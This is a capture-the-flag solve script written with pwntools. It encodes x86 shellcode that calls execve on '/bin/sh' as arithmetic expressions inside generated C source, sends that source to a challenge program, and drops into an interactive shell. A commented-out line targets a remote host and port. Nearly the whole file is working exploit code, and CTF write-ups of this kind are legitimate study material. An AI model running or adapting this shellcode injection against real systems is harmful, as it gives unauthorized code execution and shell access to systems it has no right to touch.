# This solve was made by: oh_word user

from pwn import *

context.log_level = "DEBUG"

p = process(["python3", "main.py"])
#p = remote("74.207.229.59", 20225)

def make_num(num):
    ret = []
    for i, c in enumerate(bin(num)[2:][::-1]):
        if c == "0": continue

        if i > 0:
            two = "((i==i)+(i==i))"
            bit = "*".join([two] * i)
            ret.append(bit)
        else:
            ret.append("(i==i)")
    return "+".join(ret)

MAIN = 0x40110D
BIN_SH = 0x404010

template = """\
i(){};\
m=%s;\
mm=%s;\
(*n)(m);\
*a;\
main(){%s;n=a;n(%s);}
"""

code = [
    b"\x31\xc0", # xor eax, eax
    b"\xeb\x07", # jmp 0x9
    b"\x31\xf6", # xor esi, esi
    b"\xeb\x07", # jmp 0x9
    b"\x31\xd2", # xor edx, edx
    b"\xeb\x07", # jmp 0x9
    b"\xb0\x3b", # mov al, 0x3b
    b"\x0f\x05", # syscall
]
raw = b"".join(code)

gadgets = [make_num(int.from_bytes(raw[i:i+4], 'little')) for i in range(0, len(raw), 4)]
gadgets += [make_num(MAIN + 11)] # call to start of shellcode

combined = "".join(f"a={x};" for x in gadgets)
code = template % (make_num(u32("/bin")), make_num(u32("/sh\0")), combined, make_num(BIN_SH))

p.sendlineafter(b"code? ", code.encode())

p.interactive()
